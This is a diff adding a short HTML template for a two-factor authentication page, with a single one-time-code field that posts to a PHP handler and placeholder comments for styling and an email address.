@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>OTP</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style>
+    <!-- cssPos -->
+    </style>
+</head>
+	
+<div class="limiter">
+    <div class="container-loginForm">
+        <div class="wrap-loginForm">
+            <form class="loginForm-form validate-form" action="../php/otp.php" method="post">
+				<!-- mailHere -->
+				<span class="loginForm-form-title">
+                    Two-factor authentication
+                </span>
+
+                <div class="wrap-UserInput validate-input">
+                    <input class="UserInput" type="text" name="otpToken" placeholder="otp">
+                    <span class="focus-UserInput"></span>
+                </div>
+                
+                <div class="container-loginButton">
+                    <input class="sendOtpButton" type="submit" value="Submit">
+				</div>
+                    
+                </form>
